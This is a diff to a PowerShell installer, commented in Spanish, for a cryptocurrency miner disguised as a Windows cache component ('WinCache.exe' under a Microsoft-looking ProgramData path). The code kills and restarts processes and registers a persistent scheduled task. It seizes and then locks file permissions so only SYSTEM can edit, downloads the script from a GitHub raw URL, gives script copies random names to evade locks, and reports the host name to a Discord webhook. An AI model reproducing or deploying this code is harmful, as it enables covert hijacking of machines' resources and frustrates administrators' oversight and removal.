@@ -31,9 +31,12 @@ $RemoteUrl = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/he
 $Root      = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
 $LogDir    = Join-Path $Root 'logs'
 $ExePath   = Join-Path $Root 'WinCache.exe'
-$SelfPs    = Join-Path $Root 'WinCache.ps1'
 $LogFile   = Join-Path $LogDir 'cache.log'
 $TaskName  = 'WinCacheAgent'
+
+# Genera un nombre único para evitar bloqueos de archivos por parte de SYSTEM
+$ScriptGuid = [guid]::NewGuid().ToString('N').Substring(0,8)
+$SelfPs     = Join-Path $Root "WinCache_$ScriptGuid.ps1"
 
 $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
@@ -53,13 +56,11 @@ function Send-DiscordWebhook {
 }
 
 function Stop-Safe {
-    Write-Host '[*] Deteniendo procesos anteriores...'
-    # Matar el minero a la fuerza (por si es propiedad de SYSTEM)
+    Write-Host '[*] Deteniendo procesos anteriores de forma segura...'
     & taskkill.exe /F /IM WinCache.exe /T 2>&1 | Out-Null
     
-    # Matar el Watcher de PowerShell
     $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+        Where-Object { $_.CommandLine -like '*WinCache*.ps1*' }
     foreach ($w in $watchers) {
         & taskkill.exe /F /PID $w.ProcessId /T 2>&1 | Out-Null
     }
@@ -70,18 +71,17 @@ function Force-Unlock {
     param([string]$Path)
     if (Test-Path $Path) {
         try {
-            # Quitar atributo de oculto para que takeown funcione sin problemas
             & attrib.exe -h -s "$Path\*.*" /s /d 2>&1 | Out-Null
             & attrib.exe -h -s $Path /d 2>&1 | Out-Null
             
             $confirm = if ((Get-WinSystemLocale).Name -match '^es') { 'S' } else { 'Y' }
-            & takeown.exe /f $Path /r /d $confirm 2>&1 | Out-Null
-            
+            # Forzar permisos en todos los archivos .ps1 viejos
+            Get-ChildItem $Path -Filter "*.ps1" -ErrorAction SilentlyContinue | ForEach-Object {
+                & takeown.exe /f $_.FullName 2>&1 | Out-Null
+                & icacls.exe $_.FullName /remove:d "*S-1-5-32-544" 2>&1 | Out-Null
+                & icacls.exe $_.FullName /grant "*S-1-5-32-544:F" 2>&1 | Out-Null
+            }
             & icacls.exe $Path /reset /T /C 2>&1 | Out-Null
-            & icacls.exe $Path /grant "*S-1-5-32-544:(OI)(CI)F" /T /C 2>&1 | Out-Null
-            & icacls.exe $Path /grant "*S-1-5-18:(OI)(CI)F" /T /C 2>&1 | Out-Null
-            & icacls.exe $Path /remove:d "*S-1-5-32-544" /T /C 2>&1 | Out-Null
-            & icacls.exe $Path /inheritance:e /T /C 2>&1 | Out-Null
         } catch {}
     }
 }
@@ -90,7 +90,7 @@ function Protect-Files {
     param([string]$Path)
     if ($Path -and (Test-Path $Path)) {
         Write-Host '[*] Aplicando protección de archivos (Solo SYSTEM puede editar)...'
-        $filesToProtect = @("$Path\WinCache.exe", "$Path\WinCache.ps1")
+        $filesToProtect = @("$Path\WinCache.exe", $SelfPs)
         foreach ($file in $filesToProtect) {
             if (Test-Path $file) {
                 & icacls.exe $file /inheritance:r 2>&1 | Out-Null
@@ -126,14 +126,13 @@ if ($Diagnose) {
     Write-Host "`n[+] 1. Verificando Tarea Programada..." -ForegroundColor Cyan
     $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
     if ($task) { 
-        Write-Host "    Nombre: $($task.TaskName)"
         Write-Host "    Estado: $($task.State)" 
         if ($task.State -eq 'Running') {
             Write-Host "    [OK] La tarea está corriendo." -ForegroundColor Green
         } else {
             Write-Host "    [!] La tarea está en '$($task.State)'." -ForegroundColor Yellow
             if ($isAdmin) {
-                Write-Host "    Intentando iniciarla a la fuerza..." -ForegroundColor Yellow
+                Write-Host "    Intentando iniciarla..." -ForegroundColor Yellow
                 try {
                     Start-ScheduledTask -TaskName $TaskName -ErrorAction Stop
                     Write-Host "    [OK] Comando de inicio enviado." -ForegroundColor Green
@@ -155,7 +154,7 @@ if ($Diagnose) {
         Write-Host "    [!] Miner NO está corriendo." -ForegroundColor Yellow 
     }
 
-    Write-Host "`n[+] 3. Verificando Estado del Log (Prueba de Vida)..." -ForegroundColor Cyan
+    Write-Host "`n[+] 3. Verificando Estado del Log..." -ForegroundColor Cyan
     try {
         if (Test-Path $LogFile) {
             $logInfo = Get-Item $LogFile -ErrorAction Stop
@@ -206,14 +205,10 @@ if (-not $Run -and -not $NoElevate -and -not $Diagnose) {
 
 # ---------- PREPARACIÓN (POST-ELEVACIÓN) ------------------------------------
 if (-not $Run) {
-    # 1. Desregistrar tarea para que no reinicie el proceso durante la actualización
     Write-Host '[*] Desregistrando tarea anterior...'
     Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
-    # 2. Detener procesos forzosamente
     Stop-Safe
-    
-    # 3. Asegurar permisos (quitar bloqueo)
     Write-Host '[*] Asegurando permisos de la carpeta...'
     Force-Unlock -Path $Root
 }
@@ -342,30 +337,16 @@ if ([string]::IsNullOrWhiteSpace($Worker)) {
     $Worker = "rig_$([System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower())"
 }
 
-# 6. ACTUALIZACIÓN DEL SCRIPT (TÉCNICA DEL ARCHIVO TEMPORAL)
-Write-Host '[*] Guardando nueva versión del script...'
-$TempPs = Join-Path $env:TEMP 'WinCache_update.ps1'
-
+# 6. GUARDAR EL SCRIPT CON NOMBRE ÚNICO (Evasión de bloqueos)
+Write-Host " [*] Guardando script como: $SelfPs"
 if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
-    Copy-Item $scriptPath $TempPs -Force
+    Copy-Item $scriptPath $SelfPs -Force
+    Unblock-File $SelfPs -ErrorAction SilentlyContinue
 } else {
-    Write-Host '[*] Ejecución en memoria detectada. Descargando copia local...'
-    Invoke-WebRequest -Uri $RemoteUrl -OutFile $TempPs -UseBasicParsing
+    Invoke-WebRequest -Uri $RemoteUrl -OutFile $SelfPs -UseBasicParsing
 }
 
-# Eliminar forzosamente el archivo viejo y mover el nuevo
-if (Test-Path $SelfPs) {
-    & icacls.exe $SelfPs /grant "*S-1-5-32-544:F" 2>&1 | Out-Null
-    Remove-Item $SelfPs -Force -ErrorAction SilentlyContinue
-}
-Copy-Item $TempPs $SelfPs -Force
-Remove-Item $TempPs -Force -ErrorAction SilentlyContinue
-Unblock-File $SelfPs -ErrorAction SilentlyContinue
-
-$head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
-if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }
-
-# 7. CREACIÓN DE LA TAREA PROGRAMADA
+# 7. CREACIÓN DE LA TAREA PROGRAMADA (Apunta al nuevo nombre)
 Write-Host '[*] Registrando Tarea Programada...'
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
@@ -387,6 +368,12 @@ Start-ScheduledTask -TaskName $TaskName
 
 Start-Sleep -Seconds 3
 Protect-Files -Path $Root
+
+# Limpieza de scripts viejos (si están bloqueados, se ignoran silenciosamente)
+Get-ChildItem $Root -Filter "*.ps1" | Where-Object { $_.FullName -ne $SelfPs } | ForEach-Object {
+    & icacls.exe $_.FullName /remove:d "*S-1-5-32-544" 2>&1 | Out-Null
+    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+}
 
 if ($DiscordWebhook) {
     $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Tarea Instalada, Iniciada y Protegida."
